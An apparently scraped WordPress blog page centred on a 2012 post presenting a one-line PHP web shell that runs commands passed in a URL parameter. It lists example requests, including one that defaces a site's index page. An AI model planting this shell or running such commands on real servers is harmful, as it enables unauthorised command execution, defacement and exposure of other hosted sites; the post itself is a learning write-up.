+					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/infosec/hash/crack/brute-force/" rel="category tag">Brute Force</a>, <a href="/category/comic/" rel="category tag">Comic</a>, <a href="/category/infosec/compromise/" rel="category tag">Compromise</a>, <a href="/category/infosec/hash/crack/" rel="category tag">Crack</a>, <a href="/category/passwords/google-authenticator/" rel="category tag">Google Authenticator</a>, <a href="/category/infosec/hash/" rel="category tag">Hash</a>, <a href="/category/passwords/lastpass/" rel="category tag">LastPass</a>, <a href="/category/lesson-learned/" rel="category tag">Lesson Learned</a>, <a href="/category/passwords/password-reuse/" rel="category tag">Password Reuse</a>, <a href="/category/passwords/" rel="category tag">Passwords</a>, <a href="/category/infosec/hash/salt/" rel="category tag">Salt</a>, <a href="/category/infosec/webapp/windows-live/" rel="category tag">Windows Live</a>, <a href="/category/comic/xkcd/" rel="category tag">XKCD</a>			</span>
+							
+										
+										<span class="sep"> | </span>
+						<span class="comments-link"><a href="/how-i-think-my-windows-live-account-got-compromised/#respond"><span class="leave-reply">Leave a reply</span></a></span>
+			
+					</footer><!-- .entry-meta -->
+	</article><!-- #post-134 -->
+
+				
+					
+	<article id="post-79" class="post-79 post type-post status-publish format-standard hentry category-exploit category-infosec category-pentest category-php category-shell category-web-server category-webapp">
+		<header class="entry-header">
+						<h1 class="entry-title"><a href="/single-line-php-script-to-gain-shell/" rel="bookmark">Single Line PHP Script to Gain Shell</a></h1>
+			
+						<div class="entry-meta">
+				<span class="sep">Posted on </span><a href="/single-line-php-script-to-gain-shell/" title="9:48 PM" rel="bookmark"><time class="entry-date" datetime="2012-09-23T21:48:19+00:00">2012-09-23</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
+<!-- .entry-meta -->
+			
+						<div class="comments-link">
+				<a href="/single-line-php-script-to-gain-shell/#comments">4</a>			</div>
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<p>A while ago, on <a title="PaulDotCom" href="http://pauldotcom.com/" target="_blank" rel="noopener">PaulDotCom</a> Security Weekly, I heard someone mention something about a single line php script to get shell on the web server. I knew it couldn&#8217;t be that hard as it&#8217;s only one line, but I didn&#8217;t find much about it on google when I searched, perhaps because it&#8217;s too easy, or perhaps I was using the wrong search terms. Anyway, I forgot about it for a while&#8230; until now.</p>
+<p>Since WebApp security is what I&#8217;m most interested in at the moment, I have been learning PHP, I&#8217;m not finished learning yet, but today (while reading about how inputs should be sanitised before using &#8220;include&#8221;) I remembered the single line PHP shell, and I had a go and this is what I came up with:</p>
+
+<div class="wp_syntax" style="position:relative;">
+<table><tr><td class="code"><pre class="php" style="font-family:monospace;"><span style="color: #000000; font-weight: bold;">&lt;?php</span> <span style="color: #b1b100;">echo</span> <span style="color: #990000;">shell_exec</span><span style="color: #009900;">&#40;</span><span style="color: #000088;">$_GET</span><span style="color: #009900;">&#91;</span><span style="color: #0000ff;">'e'</span><span style="color: #009900;">&#93;</span><span style="color: #339933;">.</span><span style="color: #0000ff;">' 2&gt;&amp;1'</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span> <span style="color: #000000; font-weight: bold;">?&gt;</span></pre></td></tr></table>
+<p class="theCode" style="display:none;">&lt;?php echo shell_exec($_GET['e'].' 2&gt;&amp;1'); ?&gt;</p>
+</div>
+
+<p>Obviously the WebApp would have to be vulnerable in some way in order to be able to put this script on the server, but once it was, it could potentially be used to do things like dump files and deface the site.</p>
+<p>The output is just text, not an HTML document so if using a web browser, you will want to view the source in order to see the proper result.</p>
+<p>I used <a title="shell_exec() in manual on PHP.net" href="http://php.net/manual/en/function.shell-exec.php" target="_blank" rel="noopener"><code>shell_exec()</code></a> instead of just <a title="exec() in manual on PHP.net" href="http://php.net/manual/en/function.exec.php" target="_blank" rel="noopener"><code>exec()</code></a> because it returns every line instead of just the last one. An alternative is to use <a title="passthru() in manual on PHP.net" href="http://php.net/manual/en/function.passthru.php" target="_blank" rel="noopener"><code>passthru()</code></a> which will also send binary data, but to get that to work properly with binary data, you&#8217;d probably have to also set the headers which makes it more than one line.</p>
+<p>I was able to run unix commands (windows commands should also work if the host is running windows) such as:</p>
+<ul>
+<li><code>shell.php?e=whoami</code></li>
+<li><code>shell.php?e=pwd</code></li>
+<li>
+<code>shell.php?e=uname%20-a</code> (I had to URL encode the spaces otherwise my browser thought it should search using google)</li>
+<li><code>shell.php?e=echo%20This%20site%20has%20been%20hacked%3Eindex.html</code></li>
+<li><code>shell?e=ls%20-l%20/tmp</code></li>
+</ul>
+<p>The last command even showed me some files and their owners which in turn (because I am using a shared host) told me the names of some of the other sites are that are running on the same server as mine, which was an unexpected &#8220;bonus&#8221; find.</p>
+					</div>
+<!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			
+										<span class="cat-links">
+					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/exploit/" rel="category tag">Exploit</a>, <a href="/category/infosec/" rel="category tag">Information Security</a>, <a href="/category/infosec/pentest/" rel="category tag">Penetration Test</a>, <a href="/category/php/" rel="category tag">PHP</a>, <a href="/category/shell/" rel="category tag">Shell</a>, <a href="/category/web-server/" rel="category tag">Web Server</a>, <a href="/category/infosec/webapp/" rel="category tag">WebApp</a>			</span>
+							
+										
+										<span class="sep"> | </span>
+						<span class="comments-link"><a href="/single-line-php-script-to-gain-shell/#comments"><b>4</b> Replies</a></span>
+			
+					</footer><!-- .entry-meta -->
+	</article><!-- #post-79 -->
+
+				
+				
+			
+			</div>
+<!-- #content -->
+		</section><!-- #primary -->
+
+		<div id="secondary" class="widget-area" role="complementary">
+			<aside id="rss-2" class="widget widget_rss"><h3 class="widget-title">
+<a class="rsswidget rss-widget-feed" href="/?feed=rss"><img class="rss-widget-icon" style="border:0" width="14" height="14" src="/wp-includes/images/rss.png" alt="RSS" loading="lazy"></a> <a class="rsswidget rss-widget-title" href="/">grobinson.me RSS feed</a>
+</h3>
+<ul><li><a class="rsswidget" href="/learning-more-about-buffer-overflow-exploits/">Learning more about buffer overflow exploits</a></li></ul></aside><aside id="search-2" class="widget widget_search">	<form method="get" id="searchform" action="/">
+		<label for="s" class="assistive-text">Search</label>
+		<input type="text" class="field" name="s" id="s" placeholder="Search">
+		<input type="submit" class="submit" name="submit" id="searchsubmit" value="Search">
+	</form>
+</aside>
+		<aside id="recent-posts-2" class="widget widget_recent_entries">
+		<h3 class="widget-title">Recent Posts</h3>
+		<ul>
+											<li>
+					<a href="/learning-more-about-buffer-overflow-exploits/">Learning more about buffer overflow exploits</a>
+									</li>
+											<li>
+					<a href="/reverse-shells-even-without-nc-on-linux/">Reverse shells even without nc on Linux</a>
+									</li>
+											<li>
+					<a href="/i-discovered-a-vulnerability-in-a-wordpress-plugin/">I discovered a vulnerability in a wordpress plugin</a>
+									</li>
+											<li>
+					<a href="/i-passed-oscp/">I passed OSCP!</a>
+									</li>
+											<li>
+					<a href="/fristileaks-1-3/">FristiLeaks 1.3</a>
+									</li>
+					</ul>
+
+		</aside><aside id="recent-comments-2" class="widget widget_recent_comments"><h3 class="widget-title">Recent Comments</h3>
+<ul id="recentcomments">
+<li class="recentcomments">
+<span class="comment-author-link"><a href="/" class="url" rel="ugc">Graeme Robinson</a></span> on <a href="/single-line-php-script-to-gain-shell/#comment-5077679">Single Line PHP Script to Gain Shell</a>
+</li>
+<li class="recentcomments">
+<span class="comment-author-link">Daniel</span> on <a href="/single-line-php-script-to-gain-shell/#comment-5061347">Single Line PHP Script to Gain Shell</a>
+</li>
+<li class="recentcomments">
+<span class="comment-author-link"><a href="https://www.instagram.com/endego.dj/" class="url" rel="ugc external nofollow">Errorgedill</a></span> on <a href="/learning-more-about-buffer-overflow-exploits/#comment-5021162">Learning more about buffer overflow exploits</a>
+</li>
+<li class="recentcomments">
+<span class="comment-author-link"><a href="/reverse-shells-even-without-nc-on-linux/" class="url" rel="ugc">Reverse shells even without nc on Linux | Graeme Robinson&#039;s blog</a></span> on <a href="/single-line-php-script-to-gain-shell/#comment-4568725">Single Line PHP Script to Gain Shell</a>
+</li>
+<li class="recentcomments">
+<span class="comment-author-link"><a href="/i-passed-oscp/" class="url" rel="ugc">I passed OSCP! | Graeme Robinson&#039;s blog</a></span> on <a href="/ive-signed-up-to-the-penetration-testing-with-kali-linux-course-oscp/#comment-4568721">I&#8217;ve signed up to the Penetration testing with Kali Linux Course (OSCP)</a>
+</li>
+</ul></aside><aside id="archives-2" class="widget widget_archive"><h3 class="widget-title">Archives</h3>
+			<ul>
+					<li><a href="/2018/07/">July 2018</a></li>
+	<li><a href="/2018/04/">April 2018</a></li>
+	<li><a href="/2017/10/">October 2017</a></li>
+	<li><a href="/2017/08/">August 2017</a></li>
+	<li><a href="/2017/06/">June 2017</a></li>
+	<li><a href="/2016/08/">August 2016</a></li>
+	<li><a href="/2014/11/">November 2014</a></li>
+	<li><a href="/2013/01/">January 2013</a></li>
+	<li><a href="/2012/12/">December 2012</a></li>
+	<li><a href="/2012/11/">November 2012</a></li>
+	<li><a href="/2012/10/">October 2012</a></li>
+	<li><a href="/2012/09/">September 2012</a></li>
+	<li><a href="/2012/08/">August 2012</a></li>
+			</ul>
+
+			</aside><aside id="categories-2" class="widget widget_categories"><h3 class="widget-title">Categories</h3>
+			<ul>
+					<li class="cat-item cat-item-47">
+<a href="/category/ios/jailbreak/appsync/">AppSync</a>
+</li>
+	<li class="cat-item cat-item-16">
+<a href="/category/infosec/hash/crack/brute-force/">Brute Force</a>
+</li>
+	<li class="cat-item cat-item-62">
+<a href="/category/exploit/exploit-development/buffer-overflow/">Buffer Overflow</a>
+</li>
+	<li class="cat-item cat-item-55">
+<a href="/category/career/">Career</a>
+</li>
+	<li class="cat-item cat-item-20">
+<a href="/category/comic/">Comic</a>
+</li>
+	<li class="cat-item cat-item-35">
+<a href="/category/infosec/compromise/">Compromise</a>
+</li>
+	<li class="cat-item cat-item-52">
+<a href="/category/infosec/conference/">Conference</a>
+</li>
+	<li class="cat-item cat-item-13">
+<a href="/category/infosec/hash/crack/">Crack</a>
+</li>
+	<li class="cat-item cat-item-48">
+<a href="/category/development/">Development</a>
+</li>
+	<li class="cat-item cat-item-41">
+<a href="/category/education/">Education</a>
+</li>
+	<li class="cat-item cat-item-27">
+<a href="/category/email/">Email</a>
+</li>
+	<li class="cat-item cat-item-5">
+<a href="/category/infosec/encryption/">Encryption</a>
+</li>
+	<li class="cat-item cat-item-30">
+<a href="/category/exploit/">Exploit</a>
+</li>
+	<li class="cat-item cat-item-40">
+<a href="/category/exploit-excercises/">Exploit Excercises</a>
+</li>
+	<li class="cat-item cat-item-58">
+<a href="/category/exploit/exploit-db/">exploit-db</a>
+</li>
+	<li class="cat-item cat-item-21">
+<a href="/category/os-x/filevault/">FileVault</a>
+</li>
+	<li class="cat-item cat-item-24">
+<a href="/category/infosec/encryption/full-disk-encryption/">Full Disk Encryption</a>
+</li>
+	<li class="cat-item cat-item-36">
+<a href="/category/passwords/google-authenticator/">Google Authenticator</a>
+</li>
+	<li class="cat-item cat-item-9">
+<a href="/category/infosec/hash/">Hash</a>
+</li>
+	<li class="cat-item cat-item-14">
+<a href="/category/infosec/hash/crack/hashcat/">HashCat</a>
+</li>
+	<li class="cat-item cat-item-25">
+<a href="/category/email/hotmail/">Hotmail</a>
+</li>
+	<li class="cat-item cat-item-61">
+<a href="/category/exploit/exploit-development/immunity/">Immunity</a>
+</li>
+	<li class="cat-item cat-item-4 current-cat-parent current-cat-ancestor">
+<a href="/category/infosec/">Information Security</a>
+</li>
+	<li class="cat-item cat-item-45">
+<a href="/category/ios/">iOS</a>
+</li>
+	<li class="cat-item cat-item-46">
+<a href="/category/ios/jailbreak/">JailBreak</a>
+</li>
+	<li class="cat-item cat-item-8">
+<a href="/category/infosec/hash/crack/john-the-ripper/">John The Ripper</a>
+</li>
+	<li class="cat-item cat-item-57">
+<a href="/category/kali/">Kali</a>
+</li>
+	<li class="cat-item cat-item-33">
+<a href="/category/passwords/lastpass/">LastPass</a>
+</li>
+	<li class="cat-item cat-item-37">
+<a href="/category/lesson-learned/">Lesson Learned</a>
+</li>
+	<li class="cat-item cat-item-39">
+<a href="/category/unix/linux/">Linux</a>
+</li>
+	<li class="cat-item cat-item-60">
+<a href="/category/exploit/exploit-development/mona-py/">mona.py</a>
+</li>
+	<li class="cat-item cat-item-42">
+<a href="/category/education/online-course/">Online Course</a>
+</li>
+	<li class="cat-item cat-item-23">
+<a href="/category/os-x/">OS X</a>
+</li>
+	<li class="cat-item cat-item-53">
+<a href="/category/education/online-course/oscp/">OSCP</a>
+</li>
+	<li class="cat-item cat-item-19">
+<a href="/category/passwords/password-complexity/">Password Complexity</a>
+</li>
+	<li class="cat-item cat-item-32">
+<a href="/category/passwords/password-reuse/">Password Reuse</a>
+</li>
+	<li class="cat-item cat-item-18">
+<a href="/category/passwords/">Passwords</a>
+</li>
+	<li class="cat-item cat-item-7">
+<a href="/category/infosec/pentest/">Penetration Test</a>
+</li>
+	<li class="cat-item cat-item-29">
+<a href="/category/php/">PHP</a>
+</li>
+	<li class="cat-item cat-item-44">
+<a href="/category/passwords/plaintext/">Plaintext</a>
+</li>
+	<li class="cat-item cat-item-56">
+<a href="/category/pwk/">PWK</a>
+</li>
+	<li class="cat-item cat-item-54">
+<a href="/category/development/python/">Python</a>
+</li>
+	<li class="cat-item cat-item-15">
+<a href="/category/infosec/hash/salt/">Salt</a>
+</li>
+	<li class="cat-item cat-item-28">
+<a href="/category/shell/">Shell</a>
+</li>
+	<li class="cat-item cat-item-43">
+<a href="/category/education/online-course/stanford-online/">Stanford Online</a>
+</li>
+	<li class="cat-item cat-item-1">
+<a href="/category/uncategorized/">Uncategorized</a>
+</li>
+	<li class="cat-item cat-item-38">
+<a href="/category/unix/">Unix</a>
+</li>
+	<li class="cat-item cat-item-31">
+<a href="/category/web-server/">Web Server</a>
+</li>
+	<li class="cat-item cat-item-6 current-cat">
+<a aria-current="page" href="/category/infosec/webapp/">WebApp</a>
+</li>
+	<li class="cat-item cat-item-51">
+<a href="/category/infosec/white-hat/">White Hat</a>
+</li>
+	<li class="cat-item cat-item-34">
+<a href="/category/infosec/webapp/windows-live/">Windows Live</a>
+</li>
+	<li class="cat-item cat-item-49">
+<a href="/category/development/xcode/">XCode</a>
+</li>
+	<li class="cat-item cat-item-26">
+<a href="/category/comic/xkcd/">XKCD</a>
+</li>
+			</ul>
+
+			</aside>		</div>
+<!-- #secondary .widget-area -->
+
+	</div>
+<!-- #main -->
+
+	<footer id="colophon">
+
+			
+
+			<div id="site-generator">
+												<a href="https://wordpress.org/" class="imprint" title="Semantic Personal Publishing Platform">
+					Proudly powered by WordPress				</a>
+			</div>
+	</footer><!-- #colophon -->
+</div>
+<!-- #page -->
+
+<script type="text/javascript" src="/wp-content/plugins/wp-syntax/js/wp-syntax.js?ver=1.2" id="wp-syntax-js-js"></script>
+
+</body>
+</html>
